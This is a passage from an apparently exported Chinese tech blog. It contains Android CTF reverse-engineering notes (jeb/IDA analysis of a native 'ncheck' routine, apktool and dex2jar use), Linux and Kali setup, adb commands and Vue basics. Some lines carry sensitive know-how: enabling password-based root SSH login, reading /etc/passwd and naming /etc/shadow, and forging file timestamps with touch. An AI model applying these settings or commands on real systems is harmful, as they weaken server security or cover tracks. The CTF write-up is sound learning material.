反编译出的java文件大部分都有编译错误。可以简单的阅读和分析， 但若是涉及到很细致的内容， 则还是需要依赖smali。</p><hr><h2 id="jeb"><a href="#jeb" class="headerlink" title="jeb"></a>jeb</h2><p>用于逆向工程或审计APK文件<br>常用快捷键<br>(1)重命名(n)<br>(2)跟踪(Enter, 双击)<br>(3)返回(Esc)<br>(4)前进(Ctrl + Enter)<br>(5)帮助(H)<br>(6)条目信息(I)<br>(7)交叉引用(X)，源码交叉引用(Ctrl + X)<br>(8)注释(；or C)<br>(9)改变进制数(B)<br>(10)反编译(Tab)</p><hr><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>IDA动态调试so文件</p><h3 id="IDA常用快捷键"><a href="#IDA常用快捷键" class="headerlink" title="IDA常用快捷键"></a>IDA常用快捷键</h3><p>F5: 插件转C/C++伪代码</p><h3 id="模拟器动态调试步骤"><a href="#模拟器动态调试步骤" class="headerlink" title="模拟器动态调试步骤"></a>模拟器动态调试步骤</h3><ol><li>将文件android_server push到模拟器的 /data/local/tmp目录下<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\AndroidTools\IDA7.4\dbgsrv&gt;adb push ./android_server /data/<span class="built_in">local</span>/tmp</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="00x01-easyjni"><a href="#00x01-easyjni" class="headerlink" title="00x01 easyjni"></a>00x01 easyjni</h2><p>使用jeb查看MainActivity中的内容<br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/11.png"></p><p>这里进行了两次处理，首先传入a这个类中，处理过一次，然后传到ncheck。发现ncheck是我们so文件中的函数。而a这个类是java代码。<br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/12.png"></p><p>对a类反编译，并分析:上面为密码表。<br>输入的字符经过变形的base64加密 然后传进了so 里面的方法。<br>提取出其密码表，尝试使用python写一个。<br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/13.png"><br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/14.png"></p><p>apk解压后的文件夹–&gt;lib–&gt;so文件–&gt;拖入IDA–&gt;关键字ncheck(Ctrl+F5搜索ncheck,找到这个函数，进而F5，可以看到伪代码。)<br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/15.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __fastcall <span class="title">Java_com_a_easyjni_MainActivity_ncheck</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">bool</span> v11; <span class="comment">// nf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v12; <span class="comment">// vf</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">32</span>]; <span class="comment">// [sp+3h] [bp-35h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [sp+23h] [bp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [sp+28h] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v17 = v3;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  v5 = a3;</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="built_in"><span class="keyword">int</span></span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v6) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//第一个循环分析,逻辑是将前16位与后16位对调。</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//v8保存了s1的起始位地址,s1[0]</span></span><br><span class="line">      v8 = &amp;s1[v7];</span><br><span class="line">      <span class="comment">//v6的v7+16位赋值给s1的v7位,s1[0]=v6[16]</span></span><br><span class="line">      s1[v7] = v6[v7 + <span class="number">16</span>];</span><br><span class="line">      <span class="comment">//v9保存v6的v7位置上的值,然后v7+1,v9=v6[0]，v7=1</span></span><br><span class="line">      v9 = v6[v7++];</span><br><span class="line">       <span class="comment">// 将v9 赋值给 s1[起始位+16]，s1[0+16]=v6[0]</span></span><br><span class="line">      v8[<span class="number">16</span>] = v9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( v7 != <span class="number">16</span> );</span><br><span class="line">    (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *))(*(_DWORD *)v4 + <span class="number">680</span>))(v4, v5, v6);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//__OFSUB__ 表示x-y是否溢出，溢出返回1，没有溢出返回0。</span></span><br><span class="line">      v12 = __OFSUB__(v10, <span class="number">30</span>);</span><br><span class="line">      v11 = v10 - <span class="number">30</span> &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="comment">// v16 = s1[0]</span></span><br><span class="line">      v16 = s1[v10];</span><br><span class="line">       <span class="comment">// s1[0]=s1[1]</span></span><br><span class="line">      s1[v10] = s1[v10 + <span class="number">1</span>];</span><br><span class="line">      <span class="comment">// s1[1] = v16</span></span><br><span class="line">      s1[v10 + <span class="number">1</span>] = v16;</span><br><span class="line">      v10 += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 ^ v12 );</span><br><span class="line">    v13 = <span class="built_in">memcmp</span>(s1, <span class="string">&quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;</span>, <span class="number">0x20</span>u);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *))(*(_DWORD *)v4 + <span class="number">680</span>))(v4, v5, v6);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>猜测到v6为传入的字符串。</p><p>第一个do…while，就是将前16位与后16位交换位置;<br>第二个do..while，V12是一个判断溢出，<strong>OFSUB</strong>(int a,int b)经过查询之后的作用是判断a-b是否会产生溢出，即a+(-b)是否溢出，-30补码为11100010,如果要产生溢出，那最小的补码为00100000，十进制就是16，前面那个也是16。并且在0到16期间也不可能减去30大于等于0，即V11永远为0。那么V11^V12的第一个跳出条件就是，当V10为16的时候。也能看出来作用就是两两交换位置。<br>“v13 = memcmp(s1, “MbT3sQgX039i3g==AQOoMQFPskB1Bsc7”, 0x20u)”这里，memcmp(String str1,String str2,int n)作用判断为判断str1与str2的前n位，而0x20就是32。</p><hr><p>看了一道网鼎杯Android逆向……得出一个结论(我就是一个five)</p><h2 id="rev01"><a href="#rev01" class="headerlink" title="rev01"></a>rev01</h2><p>得到一个 rev01.zip 压缩包,里面有一个apk文件<br>进入:I:\Android\Android tools\apk tool 路径下,用apktool进行解压<br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d [-s] -f F:\题目\rev01\app-release.apk -o I:\Android\Androidtools\<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>apktool解压后查看xml文件不会出现乱码</p><p><img src="https://q0o0p.top/2020/05/10/Android-Reverse/2.png"><br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/3.png"></p><p>感觉xml文件里没有要找的信息<br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/4.png"></p><p>想查看里面的class文件用dex2jar 解压dex文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar.bat F:\题目\app-release\classes.dex</span><br></pre></td></tr></table></figure><p><img src="https://q0o0p.top/2020/05/10/Android-Reverse/5.png"></p><p><img src="https://q0o0p.top/2020/05/10/Android-Reverse/6.png"></p><p>使用jd-gui-1.6.6.jar 查看 classes.dex里面的class文件<br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/7.png"></p><p>在里面找到MaintActivity.class文件<br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/8.png"><br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/9.png"><br><img src="https://q0o0p.top/2020/05/10/Android-Reverse/10.png"></p><hr><p>参考:<br>IDA:<br><a href="https://www.cnblogs.com/whycxb/p/9143896.html">https://www.cnblogs.com/whycxb/p/9143896.html</a><br><a href="https://www.52pojie.cn/thread-886103-1-1.html">https://www.52pojie.cn/thread-886103-1-1.html</a><br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1016307&amp;extra=page=1&filter=typeid&typeid=134">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1016307&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D134</a><br><a href="https://down.52pojie.cn/Tools/OllyDbg_Plugin/">https://down.52pojie.cn/Tools/OllyDbg_Plugin/</a><br>0X01:<br><a href="https://www.52pojie.cn/thread-1089083-1-1.html">https://www.52pojie.cn/thread-1089083-1-1.html</a><br><a href="https://blog.csdn.net/cookieXSS/article/details/106175001">https://blog.csdn.net/cookieXSS/article/details/106175001</a></p><p><a href="https://www.jianshu.com/p/9843e80f5ac5">https://www.jianshu.com/p/9843e80f5ac5</a></p><p>360脱壳<br><a href="https://juejin.cn/post/6844903742857281550">https://juejin.cn/post/6844903742857281550</a><br><a href="https://www.jianshu.com/p/138c9de2c987">https://www.jianshu.com/p/138c9de2c987</a></p><p>ARM 汇编基础教程番外篇——配置实验环境:<br><a href="https://bbs.pediy.com/thread-220907.htm">https://bbs.pediy.com/thread-220907.htm</a><br>ARM汇编基础教程——数据类型和寄存器:<br><a href="https://bbs.pediy.com/thread-220535.htm">https://bbs.pediy.com/thread-220535.htm</a><br>彩虹猫病毒分析:<br><a href="https://bbs.pediy.com/thread-262873.htm">https://bbs.pediy.com/thread-262873.htm</a><br>easy-java:<br><a href="https://blog.csdn.net/qq_41429081/article/details/90234730">https://blog.csdn.net/qq_41429081/article/details/90234730</a><br>easy-so:<br><a href="https://www.52pojie.cn/thread-1318827-1-1.html">https://www.52pojie.cn/thread-1318827-1-1.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础篇 + 2020 kali KDE桌面美化</title>
      <link href="/2020/05/10/linux/"/>
      <url>/2020/05/10/linux/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h2 id="0x01-linux基础配置"><a href="#0x01-linux基础配置" class="headerlink" title="0x01 linux基础配置"></a>0x01 linux基础配置</h2><ul><li><p>换yum</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources_init.list  //备份原来的源</span><br><span class="line">sudo gedit /etc/apt/sources.list  //更换源</span><br></pre></td></tr></table></figure></li><li><p>更新：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update    //  &lt;!-- wget install -y update --&gt;  更新源</span><br><span class="line"></span><br><span class="line">sudo apt-get -f install //   卸载出错的包，重新安装正确版本的</span><br><span class="line"></span><br><span class="line">sudo apt-get upgrade //  &lt;!-- wegt install -y upgrade --&gt; 更新软件</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>查找文件所在位置</li></ul><p>　　1.whereis 文件名<br>　　特点:快速,但是是模糊查找,例如 找 #whereis mysql 它会把mysql,mysql.ini,mysql.*所在的目录都找出来.</p><p>　　2.find / -name 文件名<br>　　特点:准确,但速度慢,消耗资源大,例如我想找到php.ini的准确位置,就需要用<br>　　#find / -name php.ini</p><p>　　3.locate 文件名<br>　　强力推荐的方法,最快,最好的方法.</p><hr><h2 id="0x02-桌面美化"><a href="#0x02-桌面美化" class="headerlink" title="0x02 桌面美化"></a>0x02 桌面美化</h2><h3 id="安装KDE桌面"><a href="#安装KDE桌面" class="headerlink" title="安装KDE桌面"></a>安装KDE桌面</h3><p>KDE Plasma Desktop （最小化的等离子桌面）<br>安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install kali-defaults kali-root-login desktop-base kde-plasma-desktop</span><br></pre></td></tr></table></figure><p>中途输入 y 进行安装确认。<br>然后会显示 存在多个显示管理器，确认默认显示管理器为 sddm.<br><img src="https://q0o0p.top/2020/05/10/linux/1.jpg"></p><p>更改默认显示管理器优先级</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config x-session-manager</span><br></pre></td></tr></table></figure><p>选择1,回车<br><img src="https://q0o0p.top/2020/05/10/linux/2.jpg"><br><img src="https://q0o0p.top/2020/05/10/linux/3.png"><br>卸载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove kde-plasma-desktop</span><br></pre></td></tr></table></figure><h3 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h3><p>打开菜单栏–&gt;选择系统设置<br><img src="https://q0o0p.top/2020/05/10/linux/4.png"><br>点击全局主题,默认有四个主题。<br><img src="https://q0o0p.top/2020/05/10/linux/5.png"><br>点击获取新全局主题,自行下载(根据个人喜好选择)<br><img src="https://q0o0p.top/2020/05/10/linux/6.png"><br>工作空间行为–&gt;桌面特效(自行勾选美化)<br><img src="https://q0o0p.top/2020/05/10/linux/7.png"></p><hr><h2 id="0x03-安装软件"><a href="#0x03-安装软件" class="headerlink" title="0x03 安装软件"></a>0x03 安装软件</h2><p>打开官网:<a href="https://www.sublimetext.com/3">sublimetext3</a><br>找到  Linux repos - also available as a 64 bit<br>复制链接,打开终端下载:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.sublimetext.com/sublime_text_3_build_3211_x64.tar.bz2</span><br></pre></td></tr></table></figure><p>打开下载文件目录,解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -jxvf sublime_text_3_build_3211_x64.tar.bz2</span><br></pre></td></tr></table></figure><p>找到解压后文件夹中的desktop文件，用文字的方式打开,查看“Exec=”后的路径,将文件夹移动到此路径下。</p><p>将desktop文件（启动器）移动到 /usr/share/applications 目录下,即可使用。</p><hr><h2 id="0x04-开启ssh服务"><a href="#0x04-开启ssh服务" class="headerlink" title="0x04 开启ssh服务"></a>0x04 开启ssh服务</h2><ol><li>修改sshd_config文件</li></ol><p>　　vim /etc/ssh/sshd_config</p><p>　　将#PasswordAuthentication yes的注释去掉</p><p>　　将#PermitRootLogin prohibit-password的注释去掉 ,prohibit-password 改为yes</p><ul><li>生成ssh密钥<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa  //生成密钥文件</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li><p>开放22/TCP端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ufw status  //检查防火墙状态</span><br><span class="line">ufw allow 22/tcp  //允许外部访问22端口</span><br><span class="line"></span><br><span class="line">//防火墙简单操作</span><br><span class="line">ufw <span class="built_in">enable</span> //启动防火墙</span><br><span class="line">ufw <span class="built_in">disable</span> //关闭防火墙</span><br><span class="line">ufw deny 3306//禁止外部访问3306端口</span><br></pre></td></tr></table></figure><p>centos<br>打开/etc/ssh文件夹下sshd_config<br>将监听端口个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>设置ssh开机自启</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">service sshd start  //开启ssh服务</span><br><span class="line">　　update-rc.d ssh <span class="built_in">enable</span> //设置ssh开机自启,kali</span><br><span class="line">　　update-rc.d ssh disabled //设置关闭,kali</span><br><span class="line"></span><br><span class="line">scp .ssh/id_rsa.pub user@192.168.1.23:/root/</span><br></pre></td></tr></table></figure><hr><h2 id="0x05-linux清理磁盘空间"><a href="#0x05-linux清理磁盘空间" class="headerlink" title="0x05 linux清理磁盘空间"></a>0x05 linux清理磁盘空间</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get autoclean  //自动清理</span><br><span class="line"><span class="built_in">cd</span> /var/cache/apt/archives  </span><br><span class="line">rm -rf ./*   //删除软件压缩包</span><br><span class="line"></span><br><span class="line">df -h  //查看磁盘空间占用情况</span><br></pre></td></tr></table></figure><hr><h2 id="0x06-linux基本目录信息"><a href="#0x06-linux基本目录信息" class="headerlink" title="0x06 linux基本目录信息"></a>0x06 linux基本目录信息</h2><ul><li><p>/etc/passwd  用户信息 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd </span><br></pre></td></tr></table></figure></li><li><p>/etc/shadow 密码信息</p></li><li><p>touch更改时间戳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//查看文件时间戳</span><br><span class="line"><span class="built_in">stat</span> filename </span><br><span class="line">touch -r test.txt test2.txt //更新test.txt的时间和test2.txt时间戳相同</span><br><span class="line">touch -t [[CC]YY]MMDDhhmm[.SS]  //自定义时间戳</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="0x07-linux常用加密算法"><a href="#0x07-linux常用加密算法" class="headerlink" title="0x07 linux常用加密算法"></a>0x07 linux常用加密算法</h2><ul><li>Md5加密算法</li><li>Blowfish加密算法</li><li>Sha-256加密算法</li><li>Sha-512加密算法 </li><li>DES加密算法<br>passwd</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>adb的使用</title>
      <link href="/2020/04/27/adb/"/>
      <url>/2020/04/27/adb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start adb  //启动adb</span><br><span class="line">adb devices//查看电脑是否连接到手</span><br></pre></td></tr></table></figure><ul><li>adb同一wifi下连接<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb connect 192.168.1.210:5666 </span><br></pre></td></tr></table></figure>常用命令：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">adb  pull  sdcard/XXX   pc路径    //手机复制到电脑  </span><br><span class="line">adb push pc路径  sdcard/xxx  //电脑复制到手机</span><br><span class="line"></span><br><span class="line">adb install -r（replace）apk路径    //覆盖安装</span><br><span class="line">adb install -d (downgrade) apk路径     // 降级安装</span><br><span class="line"></span><br><span class="line">adb install -s(sdcard)  apk路径  //安装到sdcard</span><br><span class="line">adb shell uninstall 包名  //卸载apk</span><br><span class="line">adb shell uninstall -k 包名 //保留数据卸载</span><br><span class="line"></span><br><span class="line">adb shell screencap -p  保存路径  //截屏(保存到手机)</span><br><span class="line">adb pull 保存路径 //截屏(保存到电脑)</span><br><span class="line">adb shell screenrecord  保存路径  //录屏</span><br><span class="line"></span><br><span class="line">adb shell rm 文件路径   //删除文件</span><br><span class="line">adb shell touch sdcard/1.txt   //创建文件</span><br><span class="line">adb shell mkdir -m 777 sdcard/q0o0p   //创建文件夹，并赋予读写能力</span><br><span class="line">adb shell rename 原始 更改后   //重命名</span><br><span class="line"></span><br></pre></td></tr></table></figure>（1）adb shell screencap -p /sdcard/screen.png</li></ul><p>（2）adb pull /sdcard/screen.png</p><ul><li>apk<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm list packages //列出手机中安装的所有apk的包名 </span><br><span class="line"></span><br><span class="line">adb shell pm list packages mtk  //寻找某个关键词的包名</span><br><span class="line"></span><br><span class="line">adb shell dumpsys window | findstr mCurrentFocus //查看当前正在运行程序的包名和活动名</span><br><span class="line">adb shell pm path 包名 //找到某个app的路径  </span><br></pre></td></tr></table></figure></li></ul><p><img src="https://q0o0p.top/2020/04/27/adb/1.png"><br>adb的使用：<br><a href="https://developer.android.google.cn/studio/command-line/adb">https://developer.android.google.cn/studio/command-line/adb</a><br>oppo镜像：<a href="https://bbs.coloros.net/firmwareLoad">https://bbs.coloros.net/firmwareLoad</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue+SpringBoot</title>
      <link href="/2020/04/18/vue/"/>
      <url>/2020/04/18/vue/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>##vue</p><h3 id="0x01-vue相关的基础命令"><a href="#0x01-vue相关的基础命令" class="headerlink" title="0x01 vue相关的基础命令"></a>0x01 vue相关的基础命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">node -v //查看node版本</span><br><span class="line">npm -v //查看npm版本</span><br><span class="line"><span class="built_in">where</span> node //查看node安装位置</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org //运行慢，配置国内淘宝镜像包(后续包安装命令 npm 即可改为 cnpm)</span><br><span class="line">npm install vue -g  //安装Vue-cli</span><br><span class="line">vue init webpack vue01 //构建项目并配置相关项 </span><br><span class="line">vue ui //使用ui界面选择</span><br><span class="line">npm install //下载项目依赖包</span><br><span class="line">npm run dev //本地启动(npm run serve)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>package.json文件中配置–host 0.0.0.0，可以局域网内访问(设置后需要重启)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;dev&quot;</span>: <span class="string">&quot;webpack-dev-server --inline --progress --config build/webpack.dev.conf.js --host 0.0.0.0&quot;</span>,</span><br></pre></td></tr></table></figure><p>在创建项目的时候选择预处理器 (Sass/Less/Stylus)。如果当时没有选好，内置的 webpack 仍然会被预配置为可以完成所有的处理。你也可以手动安装相应的 webpack loader：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Sass</span><br><span class="line">npm install -D sass-loader sass</span><br><span class="line"></span><br><span class="line"># Less</span><br><span class="line">npm install -D less-loader less</span><br><span class="line"><span class="comment">// npm install --save less less-loader</span></span><br><span class="line"></span><br><span class="line"># Stylus</span><br><span class="line">npm install -D stylus-loader stylus</span><br></pre></td></tr></table></figure><p>使用idea需要安装vue插件</p><hr><p>引用方法</p><p>1、在main.js</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> less from <span class="string">&#x27;less&#x27;</span></span><br><span class="line">Vue.use(less)</span><br></pre></td></tr></table></figure><p>2、然后创建一个.vue文件我们开始玩耍了；</p><p>注意：独立的vue文件需要引入less</p><p>1</p><style lang="less"></style><p>开始使用</p><p>1、less中变量的使用；</p><p>在less，允许我们使用以变量的形式来定义，定义方式：@k:v; 使用方式：@k;</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">div</span> class=&quot;box&quot;&gt;&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;style lang=&quot;less&quot;&gt;</span><br><span class="line"><span class="keyword">@color</span>:red;</span><br><span class="line"><span class="keyword">@k</span>:100px;</span><br><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">width</span>:@k;</span><br><span class="line"><span class="attribute">height</span>:@k;</span><br><span class="line"><span class="attribute">background</span>: @color;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/df96d02c5c30">https://www.jianshu.com/p/df96d02c5c30</a></p><h3 id="文件夹下的相关配置"><a href="#文件夹下的相关配置" class="headerlink" title="文件夹下的相关配置"></a>文件夹下的相关配置</h3><p>src/router/index.js  